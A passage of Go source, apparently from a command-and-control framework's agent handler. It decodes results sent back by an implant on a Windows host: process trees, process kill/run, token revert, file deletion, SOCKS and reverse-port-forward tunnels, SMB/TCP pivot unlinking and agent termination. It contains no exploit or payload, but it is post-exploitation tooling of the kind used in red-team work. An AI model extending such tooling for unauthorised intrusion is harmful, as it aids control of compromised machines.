					procData.ProcessName = Ts.TsConvertCpToUTF8(packer.ParseString(), agentData.ACP)
					proclist = append(proclist, procData)
				}

				type TreeProc struct {
					Data     adaptix.ListingProcessDataWin
					Children []*TreeProc
				}

				procMap := make(map[uint]*TreeProc)
				var roots []*TreeProc

				for _, proc := range proclist {
					node := &TreeProc{Data: proc}
					procMap[proc.Pid] = node
				}

				for _, node := range procMap {
					if node.Data.Ppid == 0 || node.Data.Pid == node.Data.Ppid {
						roots = append(roots, node)
					} else if parent, ok := procMap[node.Data.Ppid]; ok {
						parent.Children = append(parent.Children, node)
					} else {
						roots = append(roots, node) // orphaned node
					}
				}

				sort.Slice(roots, func(i, j int) bool {
					return roots[i].Data.Pid < roots[j].Data.Pid
				})

				var sortChildren func(node *TreeProc)
				sortChildren = func(node *TreeProc) {
					sort.Slice(node.Children, func(i, j int) bool {
						return node.Children[i].Data.Pid < node.Children[j].Data.Pid
					})
					for _, child := range node.Children {
						sortChildren(child)
					}
				}
				for _, root := range roots {
					sortChildren(root)
				}

				format := fmt.Sprintf(" %%-5v   %%-5v   %%-7v   %%-5v   %%-%vv   %%v", contextMaxSize)
				OutputText := fmt.Sprintf(format, "PID", "PPID", "Session", "Arch", "Context", "Process")
				OutputText += fmt.Sprintf("\n"+format, "---", "----", "-------", "----", "-------", "-------")

				var lines []string

				var formatTree func(node *TreeProc, prefix string, isLast bool)
				formatTree = func(node *TreeProc, prefix string, isLast bool) {
					branch := "├─ "
					if isLast {
						branch = "└─ "
					}
					treePrefix := prefix + branch
					data := node.Data

					line := fmt.Sprintf(format, data.Pid, data.Ppid, data.SessionId, data.Arch, data.Context, treePrefix+data.ProcessName)
					lines = append(lines, line)

					childPrefix := prefix
					if isLast {
						childPrefix += "    "
					} else {
						childPrefix += "│   "
					}

					for i, child := range node.Children {
						formatTree(child, childPrefix, i == len(node.Children)-1)
					}
				}

				for i, root := range roots {
					formatTree(root, "", i == len(roots)-1)
				}

				OutputText += "\n" + strings.Join(lines, "\n")
				task.Message = "Process list:"
				task.ClearText = OutputText
			}
			Ts.TsClientGuiProcessWindows(task, proclist)

		case COMMAND_PS_KILL:
			if false == packer.CheckPacker([]string{"int"}) {
				goto HANDLER
			}
			pid := packer.ParseInt32()
			task.Message = fmt.Sprintf("Process %d killed", pid)

		case COMMAND_PS_RUN:
			if false == packer.CheckPacker([]string{"int", "byte", "array"}) {
				goto HANDLER
			}
			pid := packer.ParseInt32()
			isOutput := packer.ParseInt8()
			prog := Ts.TsConvertCpToUTF8(packer.ParseString(), agentData.ACP)

			status := "no output"
			if isOutput > 0 {
				status = "with output"
			}

			task.Completed = false
			task.Message = fmt.Sprintf("Program %v started with PID %d (output - %v)", prog, pid, status)

		case COMMAND_PWD:
			if false == packer.CheckPacker([]string{"array"}) {
				goto HANDLER
			}
			path := Ts.TsConvertCpToUTF8(packer.ParseString(), agentData.ACP)
			task.Message = "Current working directory:"
			task.ClearText = path

		case COMMAND_REV2SELF:
			task.Message = "Token reverted successfully"
			_ = Ts.TsAgentUpdateDataPartial(agentData.Id, struct {
				Impersonated *string `json:"impersonated"`
			}{Impersonated: new("")})

		case COMMAND_RM:
			if false == packer.CheckPacker([]string{"byte"}) {
				goto HANDLER
			}
			result := packer.ParseInt8()
			if result == 0 {
				task.Message = "File deleted successfully"
			} else {
				task.Message = "Directory deleted successfully"
			}

		case COMMAND_TUNNEL_START_TCP:
			if false == packer.CheckPacker([]string{"byte"}) {
				goto HANDLER
			}

			channelId := int64(uint32(TaskId))
			_ = packer.ParseInt32()
			result := packer.ParseInt32()
			if result == 0 {
				Ts.TsTunnelConnectionResume(agentData.Id, channelId, false)
			} else if result == 1 {
				Ts.TsTunnelConnectionClose(channelId, true)
			} else {
				errorCode := adaptix.SOCKS5_HOST_UNREACHABLE
				if result == 10061 { // WSAECONNREFUSED
					errorCode = adaptix.SOCKS5_CONNECTION_REFUSED
				}
				Ts.TsTunnelConnectionHalt(channelId, errorCode)
			}

		case COMMAND_TUNNEL_BIND_REPLY:
			if false == packer.CheckPacker([]string{"int", "int", "array", "int"}) {
				goto HANDLER
			}
			channelId := int64(uint32(TaskId))
			phase := int(packer.ParseInt32())
			atyp := int(packer.ParseInt32())
			addr := packer.ParseBytes()
			port := int(packer.ParseInt32())
			Ts.TsTunnelConnectionBindReply(channelId, phase, atyp, addr, port)

		case COMMAND_TUNNEL_WRITE_TCP:
			if false == packer.CheckPacker([]string{"array"}) {
				goto HANDLER
			}

			channelId := int64(uint32(TaskId))
			data := packer.ParseBytes()
			Ts.TsTunnelConnectionData(channelId, data)

		case COMMAND_TUNNEL_REVERSE:
			if false == packer.CheckPacker([]string{"int", "int"}) {
				goto HANDLER
			}
			var err error
			tunnelId := int64(uint32(TaskId))
			_ = packer.ParseInt32()
			result := packer.ParseInt32()
			ok := result == 0 || result == 2
			task.TaskId, task.Message, err = Ts.TsTunnelUpdateRportfwd(tunnelId, ok)

			if err != nil {
				task.MessageType = adaptix.MESSAGE_ERROR
			} else {
				task.MessageType = adaptix.MESSAGE_SUCCESS
			}

		case COMMAND_TUNNEL_ACCEPT:
			if false == packer.CheckPacker([]string{"int"}) {
				goto HANDLER
			}
			tunnelId := int64(uint32(TaskId))
			channelId := int64(uint32(packer.ParseInt32()))
			Ts.TsTunnelConnectionAccept(tunnelId, channelId)

		case COMMAND_TUNNEL_PAUSE:
			channelId := int64(uint32(TaskId))
			Ts.TsTunnelPause(channelId)

		case COMMAND_TUNNEL_RESUME:
			channelId := int64(uint32(TaskId))
			Ts.TsTunnelResume(channelId)

		case COMMAND_TUNNEL_CLOSE:
			if false == packer.CheckPacker([]string{"int", "int"}) {
				goto HANDLER
			}
			_ = packer.ParseInt32()
			_ = packer.ParseInt32()
			channelId := int64(uint32(TaskId))
			Ts.TsTunnelConnectionClose(channelId, false)

		case COMMAND_TERMINATE:
			if false == packer.CheckPacker([]string{"int"}) {
				goto HANDLER
			}
			exitMethod := packer.ParseInt32()
			if exitMethod == 1 {
				task.Message = "The agent has completed its work (kill thread)"
			} else if exitMethod == 2 {
				task.Message = "The agent has completed its work (kill process)"
			}

			_ = Ts.TsAgentTerminate(agentData.Id, task.TaskId)

		case COMMAND_UNLINK:
			if false == packer.CheckPacker([]string{"int", "byte"}) {
				goto HANDLER
			}

			pivotId := fmt.Sprintf("%08x", packer.ParseInt32())
			pivotType := packer.ParseInt8()

			messageParent := ""
			messageChild := ""
			_, parentAgentId, childAgentId := Ts.TsGetPivotInfoById(pivotId)

			if pivotType == 1 {
				messageParent = fmt.Sprintf("SMB agent disconnected %d", childAgentId)
				messageChild = fmt.Sprintf(" ----- SMB agent disconnected from [%d] ----- ", parentAgentId)
			} else if pivotType == 2 {
				messageParent = fmt.Sprintf("TCP agent %d connection reset", childAgentId)
				messageChild = fmt.Sprintf(" ----- TCP agent connection reset ----- ")
			} else if pivotType == 10 {
				messageParent = fmt.Sprintf("Pivot agent %d connection reset", childAgentId)
				messageChild = fmt.Sprintf(" ----- Pivot agent connection reset ----- ")
			}

			if pivotType != 0 {
				_ = Ts.TsPivotDelete(pivotId)
				if TaskId == 0 {
					Ts.TsAgentConsoleOutput(parentAgentId, "", adaptix.MESSAGE_SUCCESS, messageParent, "\n", true)
				} else {
					task.Message = messageParent
				}
				Ts.TsAgentConsoleOutput(childAgentId, "", adaptix.MESSAGE_SUCCESS, messageChild, "\n", true)
			}

		case COMMAND_UPLOAD:
			task.Message = "File successfully uploaded"
			Ts.TsClientGuiFilesStatus(task)

		case COMMAND_ERROR:
			if false == packer.CheckPacker([]string{"int"}) {
				goto HANDLER
			}
			errorCode := packer.ParseInt32()
			task.Message = fmt.Sprintf("Error [%d]: %s", errorCode, Ts.TsWin32Error(errorCode))
			task.MessageType = adaptix.MESSAGE_ERROR

		default:
			continue
		}

		outTasks = append(outTasks, task)
	}

HANDLER:

	/// END CODE

	for _, task := range outTasks {
		Ts.TsTaskUpdate(agentData.Id, task)
	}

	return nil
}
